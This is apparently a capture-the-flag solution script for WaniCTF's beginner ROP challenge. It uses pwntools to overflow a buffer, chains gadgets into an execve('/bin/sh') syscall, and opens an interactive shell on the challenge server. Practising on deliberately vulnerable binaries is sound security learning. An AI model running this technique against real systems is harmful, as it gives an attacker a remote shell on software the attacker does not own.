from pwn import *
#context.log_level = 'debug'

#p = process('./chall')
p = remote("beginners-rop-pwn.wanictf.org",9005)
p.recvuntil(b'bytes) > ')

pop_rax_ret = 0x0000000000401371
xor_rdx_ret = 0x000000000040138d
xor_rsi_ret = 0x000000000040137e
syscall = 0x00000000004013af
mov_rsp_rdi_pop_ret = 0x000000000040139c
ret = 0x000000000040101a

payload = p64(0x68732f6e69622f)*5
payload +=p64(pop_rax_ret) + p64(0x3b)+ p64(xor_rdx_ret) + p64(xor_rsi_ret) + p64(mov_rsp_rdi_pop_ret) +b'/bin/sh\0' + p64(syscall)  

p.sendline(payload)
p.interactive()
